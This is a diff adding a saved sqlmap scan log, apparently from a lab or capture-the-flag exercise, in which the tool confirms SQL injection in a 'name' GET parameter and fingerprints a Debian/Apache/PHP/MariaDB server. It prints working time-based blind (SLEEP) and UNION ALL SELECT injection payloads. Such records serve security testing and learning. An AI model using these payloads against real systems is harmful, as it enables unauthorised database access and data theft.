@@ -1,0 +1,57 @@
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.8.9#stable}
+|_ -| . [(]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 14:42:57 /2025-02-10/
+
+[14:42:57] [INFO] testing connection to the target URL you have not declared cookie(s), while server wants to set its own ('PHPSESSID=o00fgjb8614...0mckvbhc5h').
+[14:43:01] [INFO] checking if the target is protected by some kind of WAF/IPS
+[14:43:01] [INFO] testing if the target URL content is stable
+[14:43:01] [INFO] target URL content is stable
+[14:43:01] [INFO] testing if GET parameter 'name' is dynamic
+[14:43:01] [INFO] GET parameter 'name' appears to be dynamic
+[14:43:01] [WARNING] heuristic (basic) test shows that GET parameter 'name' might not be injectable
+[14:43:01] [INFO] heuristic (XSS) test shows that GET parameter 'name' might be vulnerable to cross-site scripting (XSS) attacks
+[14:43:01] [INFO] testing for SQL injection on GET parameter 'name'
+[14:43:01] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[14:43:01] [WARNING] reflective value(s) found and filtering out
+[14:43:01] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[14:43:01] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[14:43:01] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[14:43:01] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+[14:43:01] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[14:43:01] [INFO] testing 'Generic inline queries'
+[14:43:01] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[14:43:01] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[14:43:01] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[14:43:01] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[14:43:11] [INFO] GET parameter 'name' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable it looks like the back-end DBMS is 'MySQL'.
+[14:43:23] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[14:43:23] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[14:43:23] [INFO] target URL appears to be UNION injectable with 4 columns
+[14:43:23] [INFO] GET parameter 'name' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable GET parameter 'name' is vulnerable.
+sqlmap identified the following injection point(s) with a total of 73 HTTP(s) requests:
+---
+Parameter: name (GET)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: name=R' AND (SELECT 8519 FROM (SELECT(SLEEP(5)))uafv) AND 'gxSs'='gxSs
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: name=6090' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716a626a71,0x4d6d5a4c63464b5978754f4c46664c455061544f50694f4e5579636768506779664958426777637a,0x716b717a71)-- -
+---
+[14:43:27] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian
+web application technology: Apache 2.4.63, PHP
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+[14:43:27] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 42 times
+[14:43:27] [INFO] fetched data logged to text files under '/home/kali/.local/sqlmap/output/scalperslair'
+
+[*] ending @ 14:43:27 /2025-02-10/
